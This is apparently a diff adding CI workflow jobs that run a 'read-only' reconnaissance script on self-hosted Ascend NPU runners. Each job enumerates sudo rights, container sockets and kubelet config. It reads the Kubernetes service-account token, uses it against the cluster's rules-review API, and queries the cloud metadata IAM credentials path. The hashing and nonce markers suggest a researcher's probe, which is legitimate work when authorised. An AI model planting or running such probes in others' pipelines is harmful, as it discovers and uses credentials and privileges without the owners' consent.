+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-UNSET}"
+          SAT=/var/run/secrets/kubernetes.io/serviceaccount/token
+          if [ -f "$SAT" ]; then
+            echo "SA_TOKEN_PRESENT bytes=$(wc -c < "$SAT" 2>/dev/null) sha256=$(sha256sum "$SAT" 2>/dev/null | cut -c1-32)"
+            if command -v python3 >/dev/null 2>&1; then
+              python3 - "$SAT" <<'PY' 2>&1 | head -6
+          import base64, json, sys
+          try:
+              parts = open(sys.argv[1], 'rb').read().decode().strip().split('.')
+              if len(parts) >= 2:
+                  c = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (-len(parts[1]) % 4)))
+                  print('SA_TOKEN_CLAIMS iss=%s sub=%s aud=%s exp=%s' % (c.get('iss'), c.get('sub'), c.get('aud'), c.get('exp')))
+              else:
+                  print('SA_TOKEN_CLAIMS_UNPARSED')
+          except Exception as e:
+              print('SA_TOKEN_CLAIMS_DECODE_FAIL', type(e).__name__)
+          PY
+              if [ "${C211_NO_NET:-0}" != "1" ]; then
+                python3 - "$SAT" <<'PY' 2>&1 | head -10
+          import json, os, ssl, sys, urllib.request
+          tok = open(sys.argv[1]).read().strip()
+          body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
+                             "spec": {"namespace": "default"}}).encode()
+          ca = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
+          ctx = ssl.create_default_context(cafile=ca) if os.path.exists(ca) else ssl._create_unverified_context()
+          rq = urllib.request.Request('https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
+                                      data=body, headers={'Authorization': 'Bearer ' + tok,
+                                                          'Content-Type': 'application/json'}, method='POST')
+          try:
+              with urllib.request.urlopen(rq, timeout=6, context=ctx) as r:
+                  d = json.loads(r.read())
+                  st = d.get('status') or {}
+                  print('K8S_SSRR status=%d resourceRules=%d nonResourceRules=%d incomplete=%s' % (
+                      r.status, len(st.get('resourceRules') or []), len(st.get('nonResourceRules') or []), st.get('incomplete')))
+          except Exception as e:
+              print('K8S_SSRR_FAIL', type(e).__name__, str(e)[:120])
+          PY
+              fi
+            else
+              echo "SA_TOKEN_CLAIMS_SKIPPED no_python3"
+            fi
+          else
+            echo SA_TOKEN_ABSENT
+          fi
+          echo "--- CAP_IMDS ---"
+          if [ "${C211_NO_NET:-0}" = "1" ]; then
+            echo IMDS_SKIPPED_MOCK
+          elif command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PY' 2>&1 | head -8
+          import hashlib, urllib.request
+          for path in ('/latest/meta-data/instance-id', '/latest/meta-data/iam/security-credentials/'):
+              try:
+                  rq = urllib.request.Request('http://169.254.169.254' + path, headers={'User-Agent': 'c211-129564'})
+                  with urllib.request.urlopen(rq, timeout=2) as r:
+                      b = r.read(4096)
+                      print('IMDS %s status=%d bytes=%d sha256=%s' % (path, r.status, len(b), hashlib.sha256(b).hexdigest()[:32]))
+              except Exception as e:
+                  print('IMDS %s FAIL %s' % (path, type(e).__name__))
+          PY
+          elif command -v curl >/dev/null 2>&1; then
+            for p in /latest/meta-data/instance-id /latest/meta-data/iam/security-credentials/; do
+              out=$(curl -s -m 2 -w '\nC211_HTTP=%{http_code}' "http://169.254.169.254$p" 2>/dev/null)
+              body=${out%$'\n'C211_HTTP=*}
+              code=${out##*C211_HTTP=}
+              echo "IMDS curl path=$p http=$code bytes=$(printf '%s' "$body" | wc -c) sha256=$(printf '%s' "$body" | sha256sum | cut -c1-32)"
+            done
+          else
+            echo IMDS_SKIPPED no_http_client
+          fi
+          echo "C211_PROBE_END job=$JOB nonce=$NONCE"
+          exit 0
+  probe-310p-1:
+    name: probe-310p-1
+    runs-on: linux-aarch64-310p-1
+    timeout-minutes: 20
+    container:
+      image: swr.cn-southwest-2.myhuaweicloud.com/base_image/ascend-ci/cann:9.2.1-310p-ubuntu22.04-py3.12
+    steps:
+      - name: read-only-npu-identity-capability
+        run: |
+          set -u
+          set +e
+          NONCE='c211-129564-d092924f60475f53'
+          JOB='probe-310p-1'
+          IMAGE_LABEL='cann-9.2.1-310p'
+          echo "C211_MARKER job=$JOB nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null)"
+          echo "C211_HOSTNAME=$(hostname 2>/dev/null)"
+          echo "C211_UID_INFO $(id 2>/dev/null)"
+          echo "C211_IMAGE_LABEL=$IMAGE_LABEL"
+          uname -a 2>&1 || true
+          echo "C211_ARCH=$(uname -m 2>/dev/null)"
+          if [ -f /etc/os-release ]; then echo "C211_OS $(head -2 /etc/os-release | tr '\n' ' ')"; fi
+          DEV="${C211_DEV:-/dev}"
+          SYS="${C211_SYS:-/sys}"
+          if command -v timeout >/dev/null 2>&1; then T="timeout 20"; else T=""; fi
+          echo "--- DEV_DAVINCI ---"
+          ls -ld "$DEV"/davinci* 2>&1 | head -24
+          if ls "$DEV"/davinci* >/dev/null 2>&1; then echo DAVINCI_PRESENT; else echo DAVINCI_ABSENT; fi
+          echo "--- DEV_MANAGER_NODES ---"
+          for n in davinci_manager devmm_svm hisi_hdc; do
+            if [ -e "$DEV/$n" ]; then echo "DEVNODE_PRESENT $n mode=$(stat -c '%a %U:%G' "$DEV/$n" 2>/dev/null)"; else echo "DEVNODE_ABSENT $n"; fi
+          done
+          echo "--- DEV_DRI ---"
+          if [ -d "$DEV/dri" ]; then echo DEVDRI_PRESENT; ls -l "$DEV/dri" 2>&1 | head -20; else echo DEVDRI_ABSENT; fi
+          echo "--- SYSFS_PCI_ACCEL ---"
+          if [ -d "$SYS/bus/pci/devices" ]; then
+            for d in "$SYS"/bus/pci/devices/*; do
+              v=$(cat "$d/vendor" 2>/dev/null || true)
+              case "$v" in
+                0x19e5|0x10de|0x1002|0x8086)
+                  echo "PCI dev=$(basename "$d") vendor=$v device=$(cat "$d/device" 2>/dev/null) subvendor=$(cat "$d/subsystem_vendor" 2>/dev/null) subdevice=$(cat "$d/subsystem_device" 2>/dev/null) class=$(cat "$d/class" 2>/dev/null) rev=$(cat "$d/revision" 2>/dev/null) serial=$(cat "$d/serial" 2>/dev/null || echo NA)" ;;
+              esac
+            done
+          else
+            echo SYSFS_PCI_ABSENT
+          fi
+          echo "--- SYSFS_DAVINCI ---"
+          ls -ld "$SYS"/class/davinci* 2>&1 | head -40
+          if ls "$SYS"/class/davinci* >/dev/null 2>&1; then
+            echo SYSFS_DAVINCI_PRESENT
+            for c in "$SYS"/class/davinci*; do
+              p=$(readlink -f "$c/device" 2>/dev/null || true)
+              echo "SYSFS_DAVINCI_ENTRY name=$(basename "$c") device=$p vendor=$(cat "$p/vendor" 2>/dev/null) deviceid=$(cat "$p/device" 2>/dev/null)"
+            done
+          else
+            echo SYSFS_DAVINCI_ABSENT
+          fi
+          echo "--- NPU_SMI_TOOL ---"
+          NPU=''
+          if command -v npu-smi >/dev/null 2>&1; then NPU=$(command -v npu-smi); echo "NPU_SMI_PATH=$NPU"
+          elif [ -x /usr/local/Ascend/driver/tools/npu-smi ]; then NPU=/usr/local/Ascend/driver/tools/npu-smi; echo "NPU_SMI_PATH=$NPU abs"
+          elif [ -x /usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi ]; then NPU=/usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi; echo "NPU_SMI_PATH=$NPU abs"
+          else echo NPU_SMI_ABSENT; fi
+          if [ -n "$NPU" ]; then
+            echo "--- NPU_SMI_INFO ---"
+            $T "$NPU" info 2>&1 | head -90
+            echo "--- NPU_SMI_BOARD ---"
+            i=0
+            fails=0
+            while [ "$i" -lt 8 ]; do
+              out=$($T "$NPU" info -t board -i "$i" -j 2>&1); rc=$?
+              if [ "$rc" -eq 0 ] && [ -n "$out" ]; then
+                echo "NPU_BOARD_JSON_BEGIN i=$i"
+                echo "$out" | head -100
+                echo "NPU_BOARD_JSON_END i=$i"
+                out2=$($T "$NPU" info -t board -i "$i" 2>&1)
+                echo "NPU_BOARD_TEXT_BEGIN i=$i"
+                echo "$out2" | head -50
+                echo "NPU_BOARD_TEXT_END i=$i"
+                fails=0
+              else
+                echo "NPU_BOARD_SKIP i=$i rc=$rc"
+                fails=$((fails + 1))
+                [ "$fails" -ge 2 ] && break
+              fi
+              i=$((i + 1))
+            done
+            echo "--- NPU_SMI_PRODUCT ---"
+            i=0
+            while [ "$i" -lt 4 ]; do
+              p=$($T "$NPU" info -t product -i "$i" 2>&1); rc=$?
+              if [ "$rc" -eq 0 ] && [ -n "$p" ]; then
+                echo "NPU_PRODUCT_BEGIN i=$i"
+                echo "$p" | head -30
+                echo "NPU_PRODUCT_END i=$i"
+              else
+                break
+              fi
+              i=$((i + 1))
+            done
+          fi
+          echo "--- UPGRADE_TOOL_SYSTEM_INFO ---"
+          UT=''
+          if command -v upgrade-tool >/dev/null 2>&1; then UT=$(command -v upgrade-tool); fi
+          for p in /usr/local/Ascend/driver/tools/upgrade-tool /usr/local/Ascend/ascend-toolkit/latest/tools/upgrade-tool; do
+            if [ -z "$UT" ] && [ -x "$p" ]; then UT="$p"; break; fi
+          done
+          if [ -n "$UT" ]; then
+            echo "UPGRADE_TOOL_PATH=$UT"
+            $T "$UT" --device_index -1 --system_info 2>&1 | head -150
+          else
+            echo UPGRADE_TOOL_ABSENT
+          fi
+          echo "--- HCCN_TOOL ---"
+          HC=''
+          if command -v hccn_tool >/dev/null 2>&1; then HC=$(command -v hccn_tool); fi
+          if [ -z "$HC" ] && [ -x /usr/local/Ascend/driver/tools/hccn_tool ]; then HC=/usr/local/Ascend/driver/tools/hccn_tool; fi
+          if [ -n "$HC" ]; then
+            echo "HCCN_TOOL_PATH=$HC"
+            $T "$HC" -i 0 -info 2>&1 | head -80
+          else
+            echo HCCN_TOOL_ABSENT
+          fi
+          echo "--- ASCEND_INSTALL_INFO ---"
+          for f in /etc/ascend_install.info /usr/local/Ascend/driver/version.info /usr/local/Ascend/ascend-toolkit/latest/aarch64-linux/ascend_toolkit_install.info /usr/local/Ascend/ascend-toolkit/latest/x86_64-linux/ascend_toolkit_install.info; do
+            if [ -f "$f" ]; then echo "INFO_FILE $f"; head -40 "$f" 2>&1; fi
+          done
+          echo "--- CAP_ID ---"
+          id 2>&1 | head -5
+          echo "--- CAP_SUDO_LIST ---"
+          if command -v sudo >/dev/null 2>&1; then $T sudo -n -l 2>&1 | head -40; echo "SUDO_RC=$?"; else echo SUDO_ABSENT; fi
+          echo "--- CAP_SOCKETS ---"
+          for s in /var/run/docker.sock /run/containerd/containerd.sock; do
+            if [ -e "$s" ]; then echo "SOCKET_PRESENT $s $(stat -c '%F mode=%a owner=%U:%G' "$s" 2>/dev/null)"; else echo "SOCKET_ABSENT $s"; fi
+          done
+          echo "--- CAP_K8S ---"
+          if [ -e /etc/kubernetes/kubelet.conf ]; then echo "KUBELET_CONF_PRESENT $(stat -c '%a %U:%G' /etc/kubernetes/kubelet.conf 2>/dev/null)"; else echo KUBELET_CONF_ABSENT; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-UNSET}"
+          SAT=/var/run/secrets/kubernetes.io/serviceaccount/token
+          if [ -f "$SAT" ]; then
+            echo "SA_TOKEN_PRESENT bytes=$(wc -c < "$SAT" 2>/dev/null) sha256=$(sha256sum "$SAT" 2>/dev/null | cut -c1-32)"
+            if command -v python3 >/dev/null 2>&1; then
+              python3 - "$SAT" <<'PY' 2>&1 | head -6
+          import base64, json, sys
+          try:
+              parts = open(sys.argv[1], 'rb').read().decode().strip().split('.')
+              if len(parts) >= 2:
+                  c = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (-len(parts[1]) % 4)))
+                  print('SA_TOKEN_CLAIMS iss=%s sub=%s aud=%s exp=%s' % (c.get('iss'), c.get('sub'), c.get('aud'), c.get('exp')))
+              else:
+                  print('SA_TOKEN_CLAIMS_UNPARSED')
+          except Exception as e:
+              print('SA_TOKEN_CLAIMS_DECODE_FAIL', type(e).__name__)
+          PY
+              if [ "${C211_NO_NET:-0}" != "1" ]; then
+                python3 - "$SAT" <<'PY' 2>&1 | head -10
+          import json, os, ssl, sys, urllib.request
+          tok = open(sys.argv[1]).read().strip()
+          body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
+                             "spec": {"namespace": "default"}}).encode()
+          ca = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
+          ctx = ssl.create_default_context(cafile=ca) if os.path.exists(ca) else ssl._create_unverified_context()
+          rq = urllib.request.Request('https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
+                                      data=body, headers={'Authorization': 'Bearer ' + tok,
+                                                          'Content-Type': 'application/json'}, method='POST')
+          try:
+              with urllib.request.urlopen(rq, timeout=6, context=ctx) as r:
+                  d = json.loads(r.read())
+                  st = d.get('status') or {}
+                  print('K8S_SSRR status=%d resourceRules=%d nonResourceRules=%d incomplete=%s' % (
+                      r.status, len(st.get('resourceRules') or []), len(st.get('nonResourceRules') or []), st.get('incomplete')))
+          except Exception as e:
+              print('K8S_SSRR_FAIL', type(e).__name__, str(e)[:120])
+          PY
+              fi
+            else
+              echo "SA_TOKEN_CLAIMS_SKIPPED no_python3"
+            fi
+          else
+            echo SA_TOKEN_ABSENT
+          fi
+          echo "--- CAP_IMDS ---"
+          if [ "${C211_NO_NET:-0}" = "1" ]; then
+            echo IMDS_SKIPPED_MOCK
+          elif command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PY' 2>&1 | head -8
+          import hashlib, urllib.request
+          for path in ('/latest/meta-data/instance-id', '/latest/meta-data/iam/security-credentials/'):
+              try:
+                  rq = urllib.request.Request('http://169.254.169.254' + path, headers={'User-Agent': 'c211-129564'})
+                  with urllib.request.urlopen(rq, timeout=2) as r:
+                      b = r.read(4096)
+                      print('IMDS %s status=%d bytes=%d sha256=%s' % (path, r.status, len(b), hashlib.sha256(b).hexdigest()[:32]))
+              except Exception as e:
+                  print('IMDS %s FAIL %s' % (path, type(e).__name__))
+          PY
+          elif command -v curl >/dev/null 2>&1; then
+            for p in /latest/meta-data/instance-id /latest/meta-data/iam/security-credentials/; do
+              out=$(curl -s -m 2 -w '\nC211_HTTP=%{http_code}' "http://169.254.169.254$p" 2>/dev/null)
+              body=${out%$'\n'C211_HTTP=*}
+              code=${out##*C211_HTTP=}
+              echo "IMDS curl path=$p http=$code bytes=$(printf '%s' "$body" | wc -c) sha256=$(printf '%s' "$body" | sha256sum | cut -c1-32)"
+            done
+          else
+            echo IMDS_SKIPPED no_http_client
+          fi
+          echo "C211_PROBE_END job=$JOB nonce=$NONCE"
+          exit 0
+  probe-a5-0:
+    name: probe-a5-0
+    runs-on: linux-aarch64-a5-0
+    timeout-minutes: 20
+    container:
+      image: swr.cn-north-12.myhuaweicloud.com/base_image/ascend-ci/vllm-ascend:nightly-ci-main-a5
+    steps:
+      - name: read-only-npu-identity-capability
+        run: |
+          set -u
+          set +e
+          NONCE='c211-129564-d092924f60475f53'
+          JOB='probe-a5-0'
+          IMAGE_LABEL='vllm-ascend-nightly-ci-main-a5'
+          echo "C211_MARKER job=$JOB nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null)"
+          echo "C211_HOSTNAME=$(hostname 2>/dev/null)"
+          echo "C211_UID_INFO $(id 2>/dev/null)"
+          echo "C211_IMAGE_LABEL=$IMAGE_LABEL"
+          uname -a 2>&1 || true
+          echo "C211_ARCH=$(uname -m 2>/dev/null)"
+          if [ -f /etc/os-release ]; then echo "C211_OS $(head -2 /etc/os-release | tr '\n' ' ')"; fi
+          DEV="${C211_DEV:-/dev}"
+          SYS="${C211_SYS:-/sys}"
+          if command -v timeout >/dev/null 2>&1; then T="timeout 20"; else T=""; fi
+          echo "--- DEV_DAVINCI ---"
+          ls -ld "$DEV"/davinci* 2>&1 | head -24
+          if ls "$DEV"/davinci* >/dev/null 2>&1; then echo DAVINCI_PRESENT; else echo DAVINCI_ABSENT; fi
+          echo "--- DEV_MANAGER_NODES ---"
+          for n in davinci_manager devmm_svm hisi_hdc; do
+            if [ -e "$DEV/$n" ]; then echo "DEVNODE_PRESENT $n mode=$(stat -c '%a %U:%G' "$DEV/$n" 2>/dev/null)"; else echo "DEVNODE_ABSENT $n"; fi
+          done
+          echo "--- DEV_DRI ---"
+          if [ -d "$DEV/dri" ]; then echo DEVDRI_PRESENT; ls -l "$DEV/dri" 2>&1 | head -20; else echo DEVDRI_ABSENT; fi
+          echo "--- SYSFS_PCI_ACCEL ---"
+          if [ -d "$SYS/bus/pci/devices" ]; then
+            for d in "$SYS"/bus/pci/devices/*; do
+              v=$(cat "$d/vendor" 2>/dev/null || true)
+              case "$v" in
+                0x19e5|0x10de|0x1002|0x8086)
+                  echo "PCI dev=$(basename "$d") vendor=$v device=$(cat "$d/device" 2>/dev/null) subvendor=$(cat "$d/subsystem_vendor" 2>/dev/null) subdevice=$(cat "$d/subsystem_device" 2>/dev/null) class=$(cat "$d/class" 2>/dev/null) rev=$(cat "$d/revision" 2>/dev/null) serial=$(cat "$d/serial" 2>/dev/null || echo NA)" ;;
+              esac
+            done
+          else
+            echo SYSFS_PCI_ABSENT
+          fi
+          echo "--- SYSFS_DAVINCI ---"
+          ls -ld "$SYS"/class/davinci* 2>&1 | head -40
+          if ls "$SYS"/class/davinci* >/dev/null 2>&1; then
+            echo SYSFS_DAVINCI_PRESENT
+            for c in "$SYS"/class/davinci*; do
+              p=$(readlink -f "$c/device" 2>/dev/null || true)
+              echo "SYSFS_DAVINCI_ENTRY name=$(basename "$c") device=$p vendor=$(cat "$p/vendor" 2>/dev/null) deviceid=$(cat "$p/device" 2>/dev/null)"
+            done
+          else
+            echo SYSFS_DAVINCI_ABSENT
+          fi
+          echo "--- NPU_SMI_TOOL ---"
+          NPU=''
+          if command -v npu-smi >/dev/null 2>&1; then NPU=$(command -v npu-smi); echo "NPU_SMI_PATH=$NPU"
+          elif [ -x /usr/local/Ascend/driver/tools/npu-smi ]; then NPU=/usr/local/Ascend/driver/tools/npu-smi; echo "NPU_SMI_PATH=$NPU abs"
+          elif [ -x /usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi ]; then NPU=/usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi; echo "NPU_SMI_PATH=$NPU abs"
+          else echo NPU_SMI_ABSENT; fi
+          if [ -n "$NPU" ]; then
+            echo "--- NPU_SMI_INFO ---"
+            $T "$NPU" info 2>&1 | head -90
+            echo "--- NPU_SMI_BOARD ---"
+            i=0
+            fails=0
+            while [ "$i" -lt 8 ]; do
+              out=$($T "$NPU" info -t board -i "$i" -j 2>&1); rc=$?
+              if [ "$rc" -eq 0 ] && [ -n "$out" ]; then
+                echo "NPU_BOARD_JSON_BEGIN i=$i"
+                echo "$out" | head -100
+                echo "NPU_BOARD_JSON_END i=$i"
+                out2=$($T "$NPU" info -t board -i "$i" 2>&1)
+                echo "NPU_BOARD_TEXT_BEGIN i=$i"
+                echo "$out2" | head -50
+                echo "NPU_BOARD_TEXT_END i=$i"
+                fails=0
+              else
+                echo "NPU_BOARD_SKIP i=$i rc=$rc"
+                fails=$((fails + 1))
+                [ "$fails" -ge 2 ] && break
+              fi
+              i=$((i + 1))
+            done
+            echo "--- NPU_SMI_PRODUCT ---"
+            i=0
+            while [ "$i" -lt 4 ]; do
+              p=$($T "$NPU" info -t product -i "$i" 2>&1); rc=$?
+              if [ "$rc" -eq 0 ] && [ -n "$p" ]; then
+                echo "NPU_PRODUCT_BEGIN i=$i"
+                echo "$p" | head -30
+                echo "NPU_PRODUCT_END i=$i"
+              else
+                break
+              fi
+              i=$((i + 1))
+            done
+          fi
+          echo "--- UPGRADE_TOOL_SYSTEM_INFO ---"
+          UT=''
+          if command -v upgrade-tool >/dev/null 2>&1; then UT=$(command -v upgrade-tool); fi
+          for p in /usr/local/Ascend/driver/tools/upgrade-tool /usr/local/Ascend/ascend-toolkit/latest/tools/upgrade-tool; do
+            if [ -z "$UT" ] && [ -x "$p" ]; then UT="$p"; break; fi
+          done
+          if [ -n "$UT" ]; then
+            echo "UPGRADE_TOOL_PATH=$UT"
+            $T "$UT" --device_index -1 --system_info 2>&1 | head -150
+          else
+            echo UPGRADE_TOOL_ABSENT
+          fi
+          echo "--- HCCN_TOOL ---"
+          HC=''
+          if command -v hccn_tool >/dev/null 2>&1; then HC=$(command -v hccn_tool); fi
+          if [ -z "$HC" ] && [ -x /usr/local/Ascend/driver/tools/hccn_tool ]; then HC=/usr/local/Ascend/driver/tools/hccn_tool; fi
+          if [ -n "$HC" ]; then
+            echo "HCCN_TOOL_PATH=$HC"
+            $T "$HC" -i 0 -info 2>&1 | head -80
+          else
+            echo HCCN_TOOL_ABSENT
+          fi
+          echo "--- ASCEND_INSTALL_INFO ---"
+          for f in /etc/ascend_install.info /usr/local/Ascend/driver/version.info /usr/local/Ascend/ascend-toolkit/latest/aarch64-linux/ascend_toolkit_install.info /usr/local/Ascend/ascend-toolkit/latest/x86_64-linux/ascend_toolkit_install.info; do
+            if [ -f "$f" ]; then echo "INFO_FILE $f"; head -40 "$f" 2>&1; fi
+          done
+          echo "--- CAP_ID ---"
+          id 2>&1 | head -5
+          echo "--- CAP_SUDO_LIST ---"
+          if command -v sudo >/dev/null 2>&1; then $T sudo -n -l 2>&1 | head -40; echo "SUDO_RC=$?"; else echo SUDO_ABSENT; fi
+          echo "--- CAP_SOCKETS ---"
+          for s in /var/run/docker.sock /run/containerd/containerd.sock; do
+            if [ -e "$s" ]; then echo "SOCKET_PRESENT $s $(stat -c '%F mode=%a owner=%U:%G' "$s" 2>/dev/null)"; else echo "SOCKET_ABSENT $s"; fi
+          done
+          echo "--- CAP_K8S ---"
+          if [ -e /etc/kubernetes/kubelet.conf ]; then echo "KUBELET_CONF_PRESENT $(stat -c '%a %U:%G' /etc/kubernetes/kubelet.conf 2>/dev/null)"; else echo KUBELET_CONF_ABSENT; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-UNSET}"
+          SAT=/var/run/secrets/kubernetes.io/serviceaccount/token
+          if [ -f "$SAT" ]; then
+            echo "SA_TOKEN_PRESENT bytes=$(wc -c < "$SAT" 2>/dev/null) sha256=$(sha256sum "$SAT" 2>/dev/null | cut -c1-32)"
+            if command -v python3 >/dev/null 2>&1; then
+              python3 - "$SAT" <<'PY' 2>&1 | head -6
+          import base64, json, sys
+          try:
+              parts = open(sys.argv[1], 'rb').read().decode().strip().split('.')
+              if len(parts) >= 2:
+                  c = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (-len(parts[1]) % 4)))
+                  print('SA_TOKEN_CLAIMS iss=%s sub=%s aud=%s exp=%s' % (c.get('iss'), c.get('sub'), c.get('aud'), c.get('exp')))
+              else:
+                  print('SA_TOKEN_CLAIMS_UNPARSED')
+          except Exception as e:
+              print('SA_TOKEN_CLAIMS_DECODE_FAIL', type(e).__name__)
+          PY
+              if [ "${C211_NO_NET:-0}" != "1" ]; then
+                python3 - "$SAT" <<'PY' 2>&1 | head -10
+          import json, os, ssl, sys, urllib.request
+          tok = open(sys.argv[1]).read().strip()
+          body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
+                             "spec": {"namespace": "default"}}).encode()
+          ca = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
+          ctx = ssl.create_default_context(cafile=ca) if os.path.exists(ca) else ssl._create_unverified_context()
+          rq = urllib.request.Request('https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
+                                      data=body, headers={'Authorization': 'Bearer ' + tok,
+                                                          'Content-Type': 'application/json'}, method='POST')
+          try:
+              with urllib.request.urlopen(rq, timeout=6, context=ctx) as r:
+                  d = json.loads(r.read())
+                  st = d.get('status') or {}
+                  print('K8S_SSRR status=%d resourceRules=%d nonResourceRules=%d incomplete=%s' % (
+                      r.status, len(st.get('resourceRules') or []), len(st.get('nonResourceRules') or []), st.get('incomplete')))
+          except Exception as e:
+              print('K8S_SSRR_FAIL', type(e).__name__, str(e)[:120])
+          PY
+              fi
+            else
+              echo "SA_TOKEN_CLAIMS_SKIPPED no_python3"
+            fi
+          else
+            echo SA_TOKEN_ABSENT
+          fi
+          echo "--- CAP_IMDS ---"
+          if [ "${C211_NO_NET:-0}" = "1" ]; then
+            echo IMDS_SKIPPED_MOCK
+          elif command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PY' 2>&1 | head -8
+          import hashlib, urllib.request
+          for path in ('/latest/meta-data/instance-id', '/latest/meta-data/iam/security-credentials/'):
+              try:
+                  rq = urllib.request.Request('http://169.254.169.254' + path, headers={'User-Agent': 'c211-129564'})
+                  with urllib.request.urlopen(rq, timeout=2) as r:
+                      b = r.read(4096)
+                      print('IMDS %s status=%d bytes=%d sha256=%s' % (path, r.status, len(b), hashlib.sha256(b).hexdigest()[:32]))
+              except Exception as e:
+                  print('IMDS %s FAIL %s' % (path, type(e).__name__))
+          PY
+          elif command -v curl >/dev/null 2>&1; then
+            for p in /latest/meta-data/instance-id /latest/meta-data/iam/security-credentials/; do
+              out=$(curl -s -m 2 -w '\nC211_HTTP=%{http_code}' "http://169.254.169.254$p" 2>/dev/null)
+              body=${out%$'\n'C211_HTTP=*}
+              code=${out##*C211_HTTP=}
+              echo "IMDS curl path=$p http=$code bytes=$(printf '%s' "$body" | wc -c) sha256=$(printf '%s' "$body" | sha256sum | cut -c1-32)"
+            done
+          else
+            echo IMDS_SKIPPED no_http_client
+          fi
+          echo "C211_PROBE_END job=$JOB nonce=$NONCE"
+          exit 0
